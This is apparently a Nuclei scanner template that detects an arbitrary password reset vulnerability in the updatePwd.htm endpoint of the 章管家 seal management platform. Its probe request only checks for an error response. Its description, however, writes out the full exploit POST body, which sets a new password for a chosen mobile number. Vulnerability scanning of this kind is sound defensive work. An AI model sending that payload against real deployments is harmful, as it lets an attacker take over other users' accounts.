id: zgj-updatepwd-reset-password

info:
  name: 章管家updatePwd.htm存在任意账号密码重置漏洞
  author: qwtd
  severity: high
  description: |
    POST data
    mobile=18888888888&newPassword=12312dsa12&equipmentName=xxxxxx&version=4.0.0&token=dingtalk_token
  reference:
    - https://github.com/wy876/POC/blob/main/%E7%AB%A0%E7%AE%A1%E5%AE%B6-%E5%8D%B0%E7%AB%A0%E6%99%BA%E6%85%A7%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E7%AB%A0%E7%AE%A1%E5%AE%B6updatePwd.htm%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E.md
  tags: 章管家

http:
  - raw:
      - |
        POST /app/updatePwd.htm HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
        Content-Length: 36
        Accept: */*
        Accept-Encoding: gzip, deflate, br
        Connection: close
        Content-Type: application/x-www-form-urlencoded

        version=4.0.0&token=dingtalk_token

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '参数错误'
          - '"errorCode":null'
        condition: and
      - type: status
        status:
          - 200
